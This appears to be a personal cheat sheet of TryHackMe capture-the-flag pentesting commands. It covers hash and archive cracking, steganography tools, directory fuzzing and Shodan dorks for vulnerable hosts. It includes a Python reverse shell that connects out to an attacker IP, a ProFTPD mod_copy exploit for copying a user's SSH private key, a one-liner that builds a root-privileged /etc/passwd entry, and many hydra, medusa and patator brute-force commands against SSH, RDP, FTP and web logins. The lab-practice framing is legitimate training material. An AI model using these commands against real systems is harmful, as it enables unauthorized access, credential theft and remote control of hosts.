# tyhackme Tricks

## <mark style="color:red;">A Repo with almost all the THM rooms</mark>

{% embed url="https://gitlab.com/dhiksec/tryhackme" %}
must checkout
{% endembed %}



### tryhackme vpn tips

{% code overflow="wrap" lineNumbers="true" %}
```bash
# incase you don't get a "Initialization sequence complete.
sudo openvpn --data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305:AES-256-CBC --config D31ng.ovpn

# when you get a: [read UDPv4 [EMSGSIZE Path-MTU=1440]: Message too long (fd=3,code=90)] error, it means the MTU size is too large.
# open the config file and add this line of cmd.
tun-mtu 1300
```
{% endcode %}

### base64, gpg

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat [filename] | base64 -d > new.txt # to decode a base64 encoded file.

gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] # encrypt files using gpg, example: gpg --cipher-algo AES256 --symmetric hash1.txt.
# to decrypt: gpg <fileName>.

# decrypting gpg encrypted files with john (jtr).
# could be a .asc file, etc..
gpg2john [encrypted_gpg_file] > [output_name]
john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]

# we can also import a pgp (public key) key/file and decrypt with gpg.
gpg --import publickey # tries to decrypt the pubkey.

===================================================
# If you hava a ".pgp" or ".asc" or ".key" file. These are keys.
===================================================
# 1st we import the key, but if require password, we can use gpg2john to crack.
gpg --import file.asc 

# 2nd after cracking/importing. Time to decrypt the ".pgp" file.
gpg --decrypt file.pgp
```
{% endcode %}

### zip2john

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we can use this utility to convert a passworded zip file into a crackable format for john.
zip2john img.zip > hash.txt
john hash.txt # to crack it.

# After cracking the password, use 7z to input password.
7z e img.zip
```
{% endcode %}

### fcrackzip

{% code overflow="wrap" lineNumbers="true" %}
```bash
# another zip cracking utility.
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <zipfile>
```
{% endcode %}

### ssh2john

{% code overflow="wrap" lineNumbers="true" %}
```bash
# to crack an ssh priv key (id_rsa key) we use ssh2john to convert it to john format.
ssh2john id_rsa > id_john

# alternative to ssh2john is sed
# we could use "sed" to achieve same result.
sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python3 - id_rsa > hash_id
```
{% endcode %}

### hash analyzer / hash cracker

{% code overflow="wrap" lineNumbers="true" %}
```bash
# identify hashes
https://www.tunnelsup.com/hash-analyzer/

# search for hashes
https://github.com/HashPals/Search-That-Hash
```
{% endcode %}

### sql

```sql
show databases;
use <name>
show tables;
describe <table_name> # display all the columns.
```

### ASN - Autonomous System Numbers

#### ASN lookup:

Get info about a company / domain ASN.

* [https://hackertarget.com/as-ip-lookup/](https://hackertarget.com/as-ip-lookup/)
* [https://mxtoolbox.com/asn.aspx](https://mxtoolbox.com/asn.aspx)
* whois lookup: [https://lookup.icann.org/](https://lookup.icann.org/en/lookup)
* ip history, dns full info of a site: [https://viewdns.info/](https://viewdns.info/)

You can find more Shodan Dorks on GitHub.

```bash
# we can search using the ASN filter.
ASN:AS14061
product:MySQL
ASN:AS14061 product:MySQL or product:NGINX # we can combine 2 search into 1.
vuln:ms17-010 # search for IP addresses vulnerable to the eternalblue exploit.
vuln:CVE-2014-0160 # heartbleed vuln.
country:US
asn:AS15169 country:"US" city:"Los Angeles"
has_screenshot:true encrypted attention
screenshot.label:ics
http.favicon.hash:-1776962843

```

{% hint style="success" %}
Note: you can always use the `ctrl+f` feature to find for important stuffs from a website source code. Like in the imaage below.


{% endhint %}

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>ctrl+f</p></figcaption></figure>

### Bypassing some python restriction to get reverse shell

In this room: [https://tryhackme.com/room/pythonplayground](https://tryhackme.com/room/pythonplayground) we had to bypass some python keywords restrction in order to get reverse shell.

Walkthrough --> [https://github.com/nonickid/Python-Playground-write-up](https://github.com/nonickid/Python-Playground-write-up)

```python
# setup a nc listener.
nc -nvlp 7345

# use the python code.
o = __import__('os')
s = __import__('socket')
p = __import__('subprocess')

k = s.socket(s.AF_INET,s.SOCK_STREAM)
k.connect(("10.18.88.214",7345))
o.dup2(k.fileno(),0)
o.dup2(k.fileno(),1)
o.dup2(k.fileno(),2)
c = p.call(["/bin/sh","-i"]);

# we got shell.
```

### Bruteforcing Http Login Forms with hydra

{% code overflow="wrap" lineNumbers="true" %}
```bash
# basic authentication
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.103.251 http-get /inferno -t 64
# with custom ports
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 164.100.83.45 http-get /manager/html -s 8080 -t 64

# template cmd..
hydra -l <username> -P <wordlist> 10.10.241.210 http-post-form "/<path_to_go>:username=^USER^&password=^PASS^:F=incorrect" -V

# example.
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.241.210 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t 10
```
{% endcode %}

### Bruteforcing Http Login using ffuf

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.8.153/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"
```
{% endcode %}

### Steganography

<details>

<summary>Tools for Image Steganography</summary>

{% code overflow="wrap" lineNumbers="true" %}
```bash
steganography
tools
steghide
foremost
stegsolve
strings
exiftool
exiv2
binwalk
zsteg
wavsteg
sonic-visualizer
web-tools
unicode-text-steganography
npiet-online
dcodefr
bruteforcers
stegcracker
fcrackzip
challenges
```
{% endcode %}

</details>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# There are many tools used to view embedded files or text on Images.
# Some are:
0. stegseek (bruteforcer).
1. xxd img.png
2. strings img.pg
3. binwalk -e img.png
4. steghide extract -sf img.png
5. outguess -r image.jpg output_file
6. https://futureboy.us/stegano/decinput.html
7. exiftool img.png
8. stegsolve.jar 
# to install stegsolve.jar
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar # to run.

==================================
# for music files (.mp3, .wav etc.)
==================================
sonic-visualiser

==================================
# For distorted files.
# when we use for example; `file image.png` to view the file type and get some distorted value or suspect the result is wrong, we can use some tools to view, modify and verify the HEX value of such files. 
# site to check the actual HEX value for all file types:
https://en.wikipedia.org/wiki/List_of_file_signatures?source=post_page-----8a8080672083--------------------------------
# tools to modify hex values.
ghex image.png
hexeditor image.png
```
{% endcode %}

### OSINT Tools

{% code overflow="wrap" lineNumbers="true" %}
```bash
Spiderfoot (github)
```
{% endcode %}

### Gobuster / FFUF / dirsearch

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.47.188/ -w /usr/share/dirb/wordlists/common.txt -x php,html,js,txt --timeout 20s -t 500 2>/dev/null

dirsearch -u http://blueprint.thm:8080/ -e php,cgi,html,txt -x 400,401,403 -r -t 100

ffuf -u http://10.10.67.73/FUZZ -w /usr/share/wordlists/dirb/big.txt
```
{% endcode %}

### pop3 / imap (110,143) cmds

Once we have valid mail credentials we can use netcat to view users mailbox.

```
nc $ip 110 # to login.
USER <username> # enter username.
PASS <passw> # enter user password.
LIST # view user imbox.
RETR 1 # view each mail with id, 1 or 2 or 3 etc...
```

### proftpd 1.3.5 exploit

{% code overflow="wrap" lineNumbers="true" %}
```bash
# the proftpd 1.3.5 is vulnerable to some file copy exploit.
# when we do a "searchsploit proftpd 1.3.5" we get a "<mod_copy>" exploit.
# The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

# assuming we have access to an NFS share ie, /var, we can copy files if we have enough privileges for example a user .ssh file. 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (142).png" alt="" width="201"><figcaption><p>1</p></figcaption></figure>

And given that we have access to an NFS share: ![](<.gitbook/assets/image (143).png>)

We can copy this ssh key to the NFS share, mount it on our kali and access it, using the proftpd 1.3.5 vuln.

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc 10.10.70.109 21 # to connect to ftp.
SITE CPFR /home/kenobi/.ssh/id_rsa # file to copy.
SITE CPTO /var/tmp/id_rsa # copy to NFS /var share.
# now, mount the share and access the ssh key.
```
{% endcode %}

## Hashcat

```bash
# cracking sha512 hash with salt.
# create a hash.txt file and enter the sha512hash and salt using the format below:
<sha512_hash>:<salt>

# crack using hashcat.
hashcat -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### /etcAdd root user to /etc/passwd file

{% code overflow="wrap" %}
```bash
# add a new user (dking) with password (password123)
echo "dking:$(openssl passwd -6 -salt dking password123):0:0:dking:/root:/bin/bash"
```
{% endcode %}

## Bruteforce

```bash
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
hydra -L username.txt -p paswordl33t -t 4 ssh://10.10.1.111
hydra -L user.txt -P pass.txt 10.10.1.111 ftp

# PATATOR
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Password spraying bruteforcer
# https://github.com/x90skysn3k/brutespray
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
```

[https://github.com/six2dez/pentest-book/blob/master/sections/enum/web/README.md](https://github.com/six2dez/pentest-book/blob/master/sections/enum/web/README.md)



